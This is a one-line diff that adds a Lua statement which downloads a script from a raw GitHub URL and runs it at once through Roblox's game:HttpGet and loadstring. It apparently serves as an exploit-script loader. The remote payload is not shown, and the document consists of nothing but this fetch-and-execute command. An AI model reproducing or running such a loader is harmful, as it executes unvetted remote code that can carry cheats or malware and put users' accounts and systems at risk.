@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TORVELIS/Don-tBeDadEZ/main/NotNae.lua"))()
